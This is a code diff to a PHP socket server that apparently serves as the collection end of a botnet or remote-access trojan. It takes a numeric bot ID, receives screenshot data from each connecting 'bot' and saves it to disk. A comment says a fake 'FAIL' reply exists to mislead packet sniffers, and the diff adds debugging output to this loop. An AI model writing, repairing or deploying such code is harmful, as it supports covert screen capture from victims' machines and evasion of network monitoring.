@@ -47,31 +47,31 @@ if (false === socket_listen($sock, 100)) {
     echo 'nope 3';
     die();
 }
-
 do {
     echo "started loop\n";
     $client = socket_accept($sock);
-    
+    socket_set_option($client,SOL_SOCKET,SO_RCVTIMEO,array("sec"=>1,"usec"=>0));
     if (false === $client) {
         echo 'rip ';
 
         die();
     }
-    echo 'connection accepted\n';
+    echo "connection accepted\n";
 
     $buffer = socket_read($client, 32, PHP_BINARY_READ);
+    echo "here1";
 
     if (! is_numeric($buffer)) {
         die();
     }
 
     $botId = $buffer;
-
     $accept = 'ACCEPT\\1';
 
     socket_write($client, $accept, strlen($accept));
+    echo "here2";
 
-    socket_set_nonblock($client);
+    //socket_set_nonblock($client);
 
     $buffer = '';
     $chunk = '';
@@ -84,8 +84,8 @@ do {
     } while (0 != strlen($chunk));
     $fileName = 'SCREENSHOT_'.$botId.'_'.date('m-d-Y-His').'.bmp';
     //if you want to, you can do compression to png here, would be much easier
-    echo $outputDirectory;
+    echo $buffer ; echo "\n---\n";
     file_put_contents($outputDirectory."/".$fileName, $buffer);
-    socket_write($client, 'FAIL', 4); // not an actual fail, just to fuck with packet sniffers
+    //socket_write($client, 'FAIL', 4); // not an actual fail, just to fuck with packet sniffers
     socket_close($client);
 } while (true);
